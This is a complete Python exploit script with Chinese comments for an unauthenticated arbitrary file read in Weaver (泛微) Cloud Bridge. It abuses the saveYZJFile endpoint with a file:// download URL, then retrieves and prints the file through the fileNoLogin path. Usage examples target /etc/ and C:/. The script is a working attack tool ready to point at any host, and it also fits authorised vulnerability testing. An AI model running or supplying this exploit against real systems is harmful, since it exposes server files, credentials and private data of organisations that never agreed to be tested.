import requests
from bs4 import BeautifulSoup
import json
import argparse
'''
    title：泛微云桥任意文件读取
    author：jdr
    example：
    Linux：python3 泛微云桥任意文件读取.py -u http://localhost/ -r /etc/
    Windows：python3 泛微云桥任意文件读取.py -u http://localhost/ -r /C:/
    ps：目前需要自行判断对方操作系统，然后读取文件内容
'''

#命令行参数
def console_help():
    parse = argparse.ArgumentParser(description="参数说明")
    parse.add_argument('-u', help='目标链接')
    parse.add_argument('-r', help='指定读取的文件内容')
    args = parse.parse_args()
    return vars(args)

#调用参数对象，执行脚本
def main():
    args = console_help()          #声明对象
    url = args['u']                #测试链接
    reading_file = args['r']       #读取文件
    test_url(url,reading_file)

#测试单个链接
def test_url(url,file):
    directory = "file/fileNoLogin/"
    payload_1 = "wxjsapi/saveYZJFile?fileName=test&fileExt=txt&downloadUrl=file://" + file
    target_1 = url +payload_1
    if 'id' in (json.loads(str(test_crawl(target_1)))):
        target_2 = url + directory + (json.loads(str(test_crawl(target_1))))['id']      # 获取id值，然后读取
        print(test_crawl(target_2))
        
    else:
        print("不存在读取漏洞")

#爬虫
def test_crawl(url):
    return BeautifulSoup(requests.get(url).text,'html.parser')

if __name__=='__main__':
    main()